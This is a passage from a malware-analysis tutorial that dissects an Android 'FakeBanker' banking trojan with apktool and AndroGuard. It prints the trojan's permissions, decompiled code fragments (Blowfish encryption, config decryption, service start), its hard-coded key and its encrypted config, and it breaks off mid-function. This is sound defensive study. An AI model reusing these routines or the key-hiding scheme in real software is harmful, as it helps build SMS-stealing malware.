#import corae.bytecodes.dvm as dvm
</code></pre></div><pre><code>Populating the interactive namespace from numpy and matplotlib
</code></pre>
<h2 id="get-malicious-apks">Get malicious APKs</h2>
<p>Now that you got everything running it&rsquo;s time to get some <strong>malicious</strong> APKs to play with. On <a href="http://contagiominidump.blogspot.de/">contagio mobile</a> you&rsquo;ll get tons of malicious files to look at. I&rsquo;ve decided to look at the <a href="http://www.mediafire.com/download/e938k6t3y6ul1yy/FakeBankerAPKs.zip">Fake Banker</a>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">(env)root@kali:~/work/apk/DroidBox/APK# wget http://www.mediafire.com/download/e938k6t3y6ul1yy/FakeBankerAPKs.zip
</code></pre></div><p>Now you&rsquo;ll have to extract the archive. As mentioned on the site you&rsquo;ll have to contact the sites maintainer in order to get the password for the files. Thanks to <a href="https://twitter.com/snowfl0w">@snowfl0w</a> for providing me the password.</p>
<blockquote>
<p><strong>NOTE</strong>: The ordinary unzip command will fail to extract the files. You should install <em>p7zip</em>.</p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">(env)root@kali:~/work/apk/DroidBox/APK# 7z e FakeBankerAPKs.zip 

7-Zip [64] 9.20  Copyright (c) 1999-2010 Igor Pavlov  2010-11-18
p7zip Version 9.20 (<span style="color:#40ffff">locale</span>=en_US.UTF-8,Utf16=on,HugeFiles=on,1 CPU)

Processing archive: FakeBankerAPKs.zip

Extracting  7276e76298c50d2ee78271cf5114a176
Enter password (will not be echoed) :

Extracting  a15b704743f53d3edb9cdd1182ca78d1
Extracting  aac4d15741abe0ee9b4afe78be090599

Everything is Ok

Files: <span style="color:#3677a9">3</span>
Size:       <span style="color:#3677a9">629877</span>
Compressed: <span style="color:#3677a9">622336</span>
</code></pre></div><h2 id="scratch-the-surface">Scratch the surface</h2>
<p>In this section we&rsquo;ll have a brief look at the APK(s):</p>
<ul>
<li>Which files does the APK contain?</li>
<li>How is the APK built?</li>
<li>Can we find some vital information e.g. permissions the APK will have when installed on the device?</li>
<li>What about other ressources?</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># Change CWD
os.chdir(&#34;/root/work/apk/DroidBox/APK&#34;)
</code></pre></div><h3 id="check-apks-contents">Check APKs contents</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
<span style="color:#6ab825;font-weight:bold">for</span> i in *; <span style="color:#6ab825;font-weight:bold">do</span> file <span style="color:#40ffff">$i</span>; <span style="color:#6ab825;font-weight:bold">done</span>
</code></pre></div><pre><code>7276e76298c50d2ee78271cf5114a176: Zip archive data, at least v2.0 to extract
a15b704743f53d3edb9cdd1182ca78d1: Zip archive data, at least v2.0 to extract
aac4d15741abe0ee9b4afe78be090599: Zip archive data, at least v2.0 to extract
</code></pre>
<h3 id="zippped-files">Zippped files</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
unzip -l 7276e76298c50d2ee78271cf5114a176
</code></pre></div><pre><code>Archive:  7276e76298c50d2ee78271cf5114a176
signed by SignApk
  Length      Date    Time    Name
---------  ---------- -----   ----
     1119  2008-02-29 05:33   META-INF/MANIFEST.MF
     1172  2008-02-29 05:33   META-INF/CERT.SF
     1714  2008-02-29 05:33   META-INF/CERT.RSA
     5004  2008-02-29 05:33   AndroidManifest.xml
   394740  2008-02-29 05:33   classes.dex
     6426  2008-02-29 05:33   res/drawable-hdpi/ic_launcher1.png
    14738  2008-02-29 05:33   res/drawable-hdpi/logo.png
     2052  2008-02-29 05:33   res/drawable-ldpi/ic_launcher1.png
     3231  2008-02-29 05:33   res/drawable-mdpi/ic_launcher1.png
     8824  2008-02-29 05:33   res/drawable-xhdpi/ic_launcher1.png
     1012  2008-02-29 05:33   res/layout/actup.xml
      620  2008-02-29 05:33   res/layout/main.xml
     4200  2008-02-29 05:33   res/layout/main2.xml
      432  2008-02-29 05:33   res/menu/main.xml
       56  2008-02-29 05:33   res/raw/blfs.key
     1048  2008-02-29 05:33   res/raw/config.cfg
     3196  2008-02-29 05:33   resources.arsc
---------                     -------
   449584                     17 files
</code></pre>
<h2 id="dump-apks-content-with-apktool">Dump APKs content with apktool</h2>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
cp 7276e76298c50d2ee78271cf5114a176 FakeBanker.apk
java -jar /root/work/bin/apktool1.5.2/apktool.jar d 7276e76298c50d2ee78271cf5114a176 output
</code></pre></div><pre><code>Destination directory (/root/work/apk/DroidBox/APK/output) already exists. Use -f switch if you want to overwrite it.
</code></pre>
<h3 id="androidmanifestxml">AndroidManifest.xml</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
cat output/AndroidManifest.xml
</code></pre></div><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;manifest android:versionCode=&quot;1&quot; android:versionName=&quot;1.0&quot; package=&quot;com.gmail.xpack&quot;
  xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;&gt;
    &lt;uses-permission android:name=&quot;android.permission.RECEIVE_BOOT_COMPLETED&quot; /&gt;
    &lt;uses-permission android:name=&quot;android.permission.READ_SMS&quot; /&gt;
    &lt;uses-permission android:name=&quot;android.permission.RECEIVE_SMS&quot; /&gt;
    &lt;uses-permission android:name=&quot;android.permission.INTERNET&quot; /&gt;
    &lt;uses-permission android:name=&quot;android.permission.READ_PHONE_STATE&quot; /&gt;
    &lt;uses-permission android:name=&quot;android.permission.ACCESS_COARSE_LOCATION&quot; /&gt;
    &lt;uses-permission android:name=&quot;android.permission.ACCESS_NETWORK_STATE&quot; /&gt;
    &lt;application android:theme=&quot;@style/AppTheme&quot; android:label=&quot;@string/app_name&quot; android:icon=&quot;@drawable/ic_launcher1&quot; android:debuggable=&quot;true&quot; android:allowBackup=&quot;false&quot;&gt;
        &lt;activity android:label=&quot;@string/app_name&quot; android:name=&quot;com.gmail.xpack.MainActivity&quot;&gt;
            &lt;intent-filter&gt;
                &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;
                &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;
            &lt;/intent-filter&gt;
        &lt;/activity&gt;
        &lt;service android:name=&quot;com.gmail.xservices.XService&quot; android:exported=&quot;false&quot;&gt;
            &lt;intent-filter&gt;
                &lt;action android:name=&quot;XMainProcessStart&quot; /&gt;
            &lt;/intent-filter&gt;
        &lt;/service&gt;
        &lt;service android:name=&quot;com.gmail.xservices.XSmsIncom&quot; /&gt;
        &lt;receiver android:name=&quot;com.gmail.xbroadcast.OnBootReceiver&quot;&gt;
            &lt;intent-filter&gt;
                &lt;action android:name=&quot;android.intent.action.BOOT_COMPLETED&quot; /&gt;
            &lt;/intent-filter&gt;
        &lt;/receiver&gt;
        &lt;receiver android:name=&quot;com.gmail.xbroadcast.MessageReceiver&quot;&gt;
            &lt;intent-filter android:priority=&quot;999&quot;&gt;
                &lt;action android:name=&quot;android.provider.Telephony.SMS_RECEIVED&quot; /&gt;
            &lt;/intent-filter&gt;
        &lt;/receiver&gt;
        &lt;receiver android:name=&quot;com.gmail.xservices.XRepeat&quot; android:process=&quot;:remote&quot; /&gt;
        &lt;receiver android:name=&quot;com.gmail.xservices.XUpdate&quot; android:process=&quot;:remote&quot; /&gt;
        &lt;activity android:name=&quot;ActUpdate&quot;&gt;
            &lt;intent-filter&gt;
                &lt;action android:name=&quot;com.gmail.xpack.updateact&quot; /&gt;
                &lt;category android:name=&quot;android.intent.category.DEFAULT&quot; /&gt;
            &lt;/intent-filter&gt;
        &lt;/activity&gt;
    &lt;/application&gt;
&lt;/manifest&gt;
</code></pre>
<h3 id="check-for-media">Check for media</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">media_paths = !find output -regextype posix-egrep -regex &#34;^.*\.(png|jpg|jpeg|gif|bmp)$&#34;
display(media_paths)
for p in media_paths:
    display(Image(filename=p))
</code></pre></div><pre><code>['output/res/drawable-ldpi/ic_launcher1.png',
 'output/res/drawable-mdpi/ic_launcher1.png',
 'output/res/drawable-xhdpi/ic_launcher1.png',
 'output/res/drawable-hdpi/logo.png',
 'output/res/drawable-hdpi/ic_launcher1.png']
</code></pre>
<p><img src="/posts/img/2014/disect-android-apks-like-a-pro-sca/output_23_1.png" alt="png"></p>
<p><img src="/posts/img/2014/disect-android-apks-like-a-pro-sca/output_23_2.png" alt="png"></p>
<p><img src="/posts/img/2014/disect-android-apks-like-a-pro-sca/output_23_3.png" alt="png"></p>
<p><img src="/posts/img/2014/disect-android-apks-like-a-pro-sca/output_23_4.png" alt="png"></p>
<p><img src="/posts/img/2014/disect-android-apks-like-a-pro-sca/output_23_5.png" alt="png"></p>
<h3 id="directory-structure">Directory structure</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
<span style="color:#999;font-style:italic"># Ignore smali directory</span>
tree -f -I <span style="color:#ed9d13">&#34;smali&#34;</span> output/
</code></pre></div><pre><code>output
â”œâ”€â”€ output/AndroidManifest.xml
â”œâ”€â”€ output/apktool.yml
â””â”€â”€ output/res
    â”œâ”€â”€ output/res/drawable-hdpi
    â”‚Â Â  â”œâ”€â”€ output/res/drawable-hdpi/ic_launcher1.png
    â”‚Â Â  â””â”€â”€ output/res/drawable-hdpi/logo.png
    â”œâ”€â”€ output/res/drawable-ldpi
    â”‚Â Â  â””â”€â”€ output/res/drawable-ldpi/ic_launcher1.png
    â”œâ”€â”€ output/res/drawable-mdpi
    â”‚Â Â  â””â”€â”€ output/res/drawable-mdpi/ic_launcher1.png
    â”œâ”€â”€ output/res/drawable-xhdpi
    â”‚Â Â  â””â”€â”€ output/res/drawable-xhdpi/ic_launcher1.png
    â”œâ”€â”€ output/res/layout
    â”‚Â Â  â”œâ”€â”€ output/res/layout/actup.xml
    â”‚Â Â  â”œâ”€â”€ output/res/layout/main2.xml
    â”‚Â Â  â””â”€â”€ output/res/layout/main.xml
    â”œâ”€â”€ output/res/menu
    â”‚Â Â  â””â”€â”€ output/res/menu/main.xml
    â”œâ”€â”€ output/res/raw
    â”‚Â Â  â”œâ”€â”€ output/res/raw/blfs.key
    â”‚Â Â  â””â”€â”€ output/res/raw/config.cfg
    â””â”€â”€ output/res/values
        â”œâ”€â”€ output/res/values/ids.xml
        â”œâ”€â”€ output/res/values/public.xml
        â”œâ”€â”€ output/res/values/strings.xml
        â””â”€â”€ output/res/values/styles.xml

9 directories, 17 files
</code></pre>
<h3 id="first-findings">First findings</h3>
<p>Having a look at the <em>AndroidManifest.xml</em> file itself you can see that we have a <em>MessageReceiver</em> with a quite high priority:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"> <span style="color:#6ab825;font-weight:bold">&lt;receiver</span> <span style="color:#bbb">android:name=</span><span style="color:#ed9d13">&#34;com.gmail.xbroadcast.MessageReceiver&#34;</span><span style="color:#6ab825;font-weight:bold">&gt;</span>
            <span style="color:#6ab825;font-weight:bold">&lt;intent-filter</span> <span style="color:#bbb">android:priority=</span><span style="color:#ed9d13">&#34;999&#34;</span><span style="color:#6ab825;font-weight:bold">&gt;</span>
                <span style="color:#6ab825;font-weight:bold">&lt;action</span> <span style="color:#bbb">android:name=</span><span style="color:#ed9d13">&#34;android.provider.Telephony.SMS_RECEIVED&#34;</span> <span style="color:#6ab825;font-weight:bold">/&gt;</span>
            <span style="color:#6ab825;font-weight:bold">&lt;/intent-filter&gt;</span>
 <span style="color:#6ab825;font-weight:bold">&lt;/receiver&gt;</span>
</code></pre></div><p>That looks very suspicious as well. What about the main <strong>entry point</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"> <span style="color:#6ab825;font-weight:bold">&lt;activity</span> <span style="color:#bbb">android:label=</span><span style="color:#ed9d13">&#34;@string/app_name&#34;</span> <span style="color:#bbb">android:name=</span><span style="color:#ed9d13">&#34;com.gmail.xpack.MainActivity&#34;</span><span style="color:#6ab825;font-weight:bold">&gt;</span>
            <span style="color:#6ab825;font-weight:bold">&lt;intent-filter&gt;</span>
                <span style="color:#6ab825;font-weight:bold">&lt;action</span> <span style="color:#bbb">android:name=</span><span style="color:#ed9d13">&#34;android.intent.action.MAIN&#34;</span> <span style="color:#6ab825;font-weight:bold">/&gt;</span>
                <span style="color:#6ab825;font-weight:bold">&lt;category</span> <span style="color:#bbb">android:name=</span><span style="color:#ed9d13">&#34;android.intent.category.LAUNCHER&#34;</span> <span style="color:#6ab825;font-weight:bold">/&gt;</span>
            <span style="color:#6ab825;font-weight:bold">&lt;/intent-filter&gt;</span>
 <span style="color:#6ab825;font-weight:bold">&lt;/activity&gt;</span>
</code></pre></div><p>So obviously the class <em>com.gmail.xpack.MainActivity</em> contains the main entry point. In the next steps we will have a closer look at the code. Besides that there are 2 files which might be interesting:</p>
<ul>
<li><code>output/res/raw/blfs.key</code></li>
<li><code>output/res/raw/config.cfg</code></li>
</ul>
<h2 id="static-code-analysis-using-androguard">Static code analysis using AndroGuard</h2>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># Use AndroGuard to static analysis
# Have a look at https://code.google.com/p/androguard/wiki/RE for some introduction
#a = anz.APK(&#39;KC.apk&#39;)
a, d, dx = anz.AnalyzeAPK(&#39;FakeBanker.apk&#39;,decompiler=&#39;dex2jar&#39;)
&#34;&#34;&#34;
d = anz.DalvikVMFormat(a.get_dex())
dx = anz.VMAnalysis( d )
gx = anz.GVMAnalysis( dx, None )
d.set_vmanalysis( dx )
d.set_gvmanalysis( gx )
&#34;&#34;&#34;
</code></pre></div><pre><code>'\nd = anz.DalvikVMFormat(a.get_dex())\ndx = anz.VMAnalysis( d )\ngx = anz.GVMAnalysis( dx, None )\nd.set_vmanalysis( dx )\nd.set_gvmanalysis( gx )\n'
</code></pre>
<h3 id="analyze-the-manifest-file">Analyze the manifest file</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">a.files
</code></pre></div><pre><code>{'AndroidManifest.xml': 'Unknown',
 'META-INF/CERT.RSA': 'Unknown',
 'META-INF/CERT.SF': 'Unknown',
 'META-INF/MANIFEST.MF': 'Unknown',
 'classes.dex': 'Unknown',
 'res/drawable-hdpi/ic_launcher1.png': 'Unknown',
 'res/drawable-hdpi/logo.png': 'Unknown',
 'res/drawable-ldpi/ic_launcher1.png': 'Unknown',
 'res/drawable-mdpi/ic_launcher1.png': 'Unknown',
 'res/drawable-xhdpi/ic_launcher1.png': 'Unknown',
 'res/layout/actup.xml': 'Unknown',
 'res/layout/main.xml': 'Unknown',
 'res/layout/main2.xml': 'Unknown',
 'res/menu/main.xml': 'Unknown',
 'res/raw/blfs.key': 'Unknown',
 'res/raw/config.cfg': 'Unknown',
 'resources.arsc': 'Unknown'}
</code></pre>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">a.permissions
</code></pre></div><pre><code>['android.permission.RECEIVE_BOOT_COMPLETED',
 'android.permission.READ_SMS',
 'android.permission.RECEIVE_SMS',
 'android.permission.INTERNET',
 'android.permission.READ_PHONE_STATE',
 'android.permission.ACCESS_COARSE_LOCATION',
 'android.permission.ACCESS_NETWORK_STATE']
</code></pre>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">a.get_activities()
</code></pre></div><pre><code>['com.gmail.xpack.MainActivity', 'com.gmail.xpack.ActUpdate']
</code></pre>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">a.get_services()
</code></pre></div><pre><code>['com.gmail.xservices.XService', 'com.gmail.xservices.XSmsIncom']
</code></pre>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">a.get_receivers()
</code></pre></div><pre><code>['com.gmail.xbroadcast.OnBootReceiver',
 'com.gmail.xbroadcast.MessageReceiver',
 'com.gmail.xservices.XRepeat',
 'com.gmail.xservices.XUpdate']
</code></pre>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">a.get_main_activity()
</code></pre></div><pre><code>u'com.gmail.xpack.MainActivity'
</code></pre>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">d.CLASS_Lcom_gmail_xpack_MainActivity.METHOD_onCreate.source()
</code></pre></div><pre><code>    protected void onCreate(android.os.Bundle p5)
    {
        super.onCreate(p5);
        this.setContentView(1.741289080126432e+38);
        this.show_hide(Integer.valueOf(com.gmail.xlibs.myFunctions.getVar(&quot;PASSADDED&quot;, 0, this)));
        com.gmail.xlibs.myFunctions.sendLog(&quot;START&quot;, &quot;Service started&quot;, this);
        this.startService(new android.content.Intent(&quot;XMainProcessStart&quot;).putExtra(&quot;name&quot;, &quot;value&quot;));
        return;
    }
</code></pre>
<p>Ok let&rsquo;s have a look at <strong>com.gmail.xlibs.myFunctions</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">methods = d.CLASS_Lcom_gmail_xlibs_myFunctions.get_methods()
for m in methods: print(m.get_name())
</code></pre></div><pre><code>&lt;init&gt;
IntToStr
StrToInt
checkPhone
deviceInfo
foundCodeInSms
getCheckedURL
getFirst
getRawData
getSecond
getVar
getVar
in_array
isOnline
loadNumFromPreferences
parseXml
sendFromDb
sendLog
sendMessge
setK12
setVar
setVar
setVarsList
typeInternetConnection
</code></pre>
<p>Having a look at the whole class you can see that there are a <em>lot</em> of methods. But this one looks very interesting:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">d.CLASS_Lcom_gmail_xlibs_myFunctions.METHOD_setK12.source()
</code></pre></div><pre><code>    public static String setK12(String p4, android.content.Context p5)
    {
        String v2;
        String v1 = com.gmail.xlibs.myFunctions.getVar(&quot;BLFSK&quot;, &quot;&quot;, p5);
        if (v1.length() &lt;= 0) {
            v2 = &quot;&quot;;
        } else {
            v2 = new com.gmail.xlibs.Blowfish(v1, &quot;base64&quot;, &quot;12345678&quot;).encrypt(p4);
        }
        return v2;
    }
</code></pre>
<h2 id="decrypting-stuff">Decrypting stuff</h2>
<p>Apparently there is an encryption routine (<em>Blowfish</em>) used for some <em>stuff</em>. In this case a new class <code>v2</code> is initialized. The constructor gets several parameters:</p>
<ul>
<li>content of <code>BLFSK</code> (<code>v1</code>)</li>
<li>base64 (I thing this sort of flag)</li>
<li>&ldquo;1234578&rdquo; (Looks like some IV)</li>
</ul>
<p>Let&rsquo;s have a look at the <strong>Blowfish</strong> class:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">d.CLASS_Lcom_gmail_xlibs_Blowfish.METHOD_init.source()
</code></pre></div><pre><code>    public Blowfish(String p2, String p3, String p4)
    {
        this.IV = &quot;12345678&quot;;
        this.in_out_format = &quot;clear&quot;;
        this.IV = p4;
        this.strkey = p2;
        this.in_out_format = p3;
        return;
    }
</code></pre>
<p><code>p2</code> (the first argument) is the key. Looking one step before let&rsquo;s find out what&rsquo;s inside the <code>BLFSK</code> variable. First let&rsquo;s see where the variable is beeing used:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">z = dx.tainted_variables.get_string(&#34;BLFSK&#34;)
if z: z.show_paths(d)
</code></pre></div><pre><code>R 62 Lcom/gmail/xlibs/myFunctions;-&gt;getFirst (Landroid/content/Context;)V
R 17c Lcom/gmail/xlibs/myFunctions;-&gt;getFirst (Landroid/content/Context;)V
R e8 Lcom/gmail/xlibs/myFunctions;-&gt;getSecond (Landroid/content/Context;)V
R 0 Lcom/gmail/xlibs/myFunctions;-&gt;setK12 (Ljava/lang/String; Landroid/content/Context;)Ljava/lang/String;
</code></pre>
<p>Let&rsquo;s search for some content/files:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
find output -name <span style="color:#ed9d13">&#34;blfs*&#34;</span>
</code></pre></div><pre><code>output/res/raw/blfs.key
</code></pre>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
cat output/res/raw/blfs.key
</code></pre></div><pre><code>NfvnkjlnvkjKCNXKDKLFHSKD:LJmdklsXKLNDS:&lt;XObcniuaebkjxbcz
</code></pre>
<p>Well that looks like a key to me :). What else can we find inside <code>output/res/raw</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
ls -l output/res/raw
</code></pre></div><pre><code>total 8
-rw-r--r-- 1 root root   56 Jun 25 13:26 blfs.key
-rw-r--r-- 1 root root 1048 Jun 25 13:26 config.cfg
</code></pre>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
cat output/res/raw/config.cfg
</code></pre></div><pre><code>HoBbgAt+xT9vXJUlyhYYAVOx5Oy4XSMLyc7JC+ly5a1tbUtWvFMny2yqavP9D9GT0ogg2U4LN5FZE8/0Y2duLgE7dfXLPcaeXKoIuTmJ4LBiUjS0OokxUPMOrJYCTCx2oWGmdHJqohz7QlbqnZPWch9BvjiWG3TeXKDkjrPKohMswoPA/EVQy3is6XBBfqYKoExCDci14mcoHfnbw1V+YAJlwONpjn1dmzVkJLVQ4ZEbg2WPD5LnXwhdGkhVXF4kS/pHk+6h4ZVd4CMcG7kbWpe7f/dbBX3zJ2NXP+E+MxYW/MTYrNRBMQIfZbuhGmsULXjpHb16R19NZvV4qQwi68KrFbc5hZyfSkWUwD50t2O3o9mSQB3/IlqzzA7VE3XxrsUkZQcBYEixFshSTN+lywZwohooyjGiPEhof7k08bo3YgkDh/8vMR1rttvUKs0xTdQtLF8iER8GDCt6ZUtG0+Lf2G+THOw/Azp/ipC3JJ7Rcj0m1uTj3AAjwfK69rcbtCTP6q5qV8pDEtSr3foU7KZvjCXJL/8TVvZozttjoHnJhI3x5KGKLrczoavKsbiR0iI3ncwGTI5CQ7uZwfMkB5Q2Y4M7oDFTurCPT3iRAvhUQN3Ah8TKAyzwACUlCk9nA2A7H9IFfTgI2QvaXQlNxkPeZMh+iOYImUELMSbNQ1HpsaF1Bbymg6vWTgvyViVsAjf+Y22y+n0eFJicsLPzc9GNs6bCgPCIDVRr2iLoiXjP8AE4gQUdxfqCQ1JtvBfWXmB4kAWb1ciuqsE1Zff+aahnT1Qbet1vA6g9DsTLuumqX0tjmCD/E50eL48Bz0etthaS7RbJiIpg3SU9Lio1GmZeYBB9/4FW4CB1M+cH9jjjKmj4sXUwcLrBDgD+JvCEc7VGxdLj/Ori631mkWvRtlKC4sIOLlHQEDwRcXDgvLnAKZYG65Tm4a5gr490Yco1QSKxeMkMKvMitGQS87ObKaqr30nfXZHMwdWLc6Q437aVyOxc9GvxGC7qmtnYU4Pw5alh1XKtXdjY4EGsVhk/MQ==
</code></pre>
<p>I&rsquo;ve checked that content and it&rsquo;s <strong>base64</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
base64 -d output/res/raw/config.cfg &gt; output/res/raw/config.cfg.raw
file output/res/raw/config.cfg.raw
</code></pre></div><pre><code>output/res/raw/config.cfg.raw: data
</code></pre>
<p>Ok. Now let&rsquo;s decrypt that file. But first let&rsquo;s have a look at the used encryption parameters:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">d.CLASS_Lcom_gmail_xlibs_Blowfish.METHOD_encrypt.source()
</code></pre></div><pre><code>    public String encrypt(String p10)
    {
        try {
            String v7;
            javax.crypto.spec.SecretKeySpec v6 = new javax.crypto.spec.SecretKeySpec(this.strkey.getBytes(), &quot;Blowfish&quot;);
            javax.crypto.Cipher v0 = javax.crypto.Cipher.getInstance(&quot;Blowfish/CBC/PKCS5Padding&quot;);
            v0.init(1, v6, new javax.crypto.spec.IvParameterSpec(this.IV.getBytes()));
            byte[] v3 = v0.doFinal(p10.getBytes());
        } catch (Exception v1) {
            v7 = 0;
            return v7;
        }
        if (this.in_out_format != &quot;base64&quot;) {
            if (this.in_out_format != &quot;hex&quot;) {
                v7 = new String(v3, &quot;UTF8&quot;);
            } else {
                v7 = com.gmail.xlibs.Blowfish.byte2hex(v3);
            }
        } else {
            v7 = android.util.Base64.encodeToString(v3, 0);
        }
        return v7;
    }
</code></pre>
<p>So we have <strong>Blowfish</strong> with <a href="http://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Cipher-block_chaining_.28CBC.29"><strong>CBC</strong></a>. The <strong>decryption</strong> method:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">d.CLASS_Lcom_gmail_xlibs_Blowfish.METHOD_decrypt.source()
</code></pre></div><pre><code>    public String decrypt(String p9)
    {
        try {
            byte[] v1;
            javax.crypto.spec.SecretKeySpec v5 = new javax.crypto.spec.SecretKeySpec(this.strkey.getBytes(), &quot;Blowfish&quot;);
            javax.crypto.Cipher v0 = javax.crypto.Cipher.getInstance(&quot;Blowfish/CBC/PKCS5Padding&quot;);
            v0.init(2, v5, new javax.crypto.spec.IvParameterSpec(this.IV.getBytes()));
        } catch (Exception v2) {
            byte[] v6 = 0;
            return v6;
        }
        if (this.in_out_format != &quot;base64&quot;) {
            if (this.in_out_format != &quot;hex&quot;) {
                v1 = v0.doFinal(p9.getBytes(&quot;UTF8&quot;));
            } else {
                v1 = v0.doFinal(com.gmail.xlibs.Blowfish.hex2byte(p9));
            }
        } else {
            v1 = v0.doFinal(android.util.Base64.decode(p9, 0));
        }
        v6 = new String(v1);
        return v6;
    }
</code></pre>
<p>As I&rsquo;ve looked into the code I&rsquo;ve noticed that a new <code>Blowfish</code> class is initiated in <em>com/xlibs/myFunctions.class</em>.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">d.CLASS_Lcom_gmail_xlibs_myFunctions.METHOD_getFirst.source()
</code></pre></div><pre><code>    public static void getFirst(android.content.Context p14)
    {
        if (com.gmail.xlibs.myFunctions.getVar(&quot;RID&quot;, 0, p14) == 0) {
            String v5 = com.gmail.xlibs.myFunctions.getRawData(1.754580954436089e+38, 0, p14);
            com.gmail.xlibs.myFunctions.parseXml(new com.gmail.xlibs.Blowfish(v5, &quot;base64&quot;, &quot;12345678&quot;).decrypt(com.gmail.xlibs.myFunctions.getRawData(1.754581157260185e+38, 1, p14)), p14);
            int v0 = com.gmail.xlibs.myFunctions.getVar(&quot;RID&quot;, 0, p14);
            if (v0 != 0) {
                com.gmail.xlibs.myFunctions.setVar(&quot;BLFSK&quot;, v5, p14);
                com.gmail.xlibs.myFunctions.setVar(&quot;RID&quot;, v0, p14);
                String v9 = com.gmail.xlibs.myFunctions.getVar(&quot;USE_URL_MAIN&quot;, &quot;&quot;, p14);
                if (v9.trim().length() &gt; 0) {
                    String[] v7 = new String[3];
                    v7[0] = &quot;data&quot;;
                    v7[1] = &quot;rid&quot;;
                    v7[2] = &quot;first&quot;;
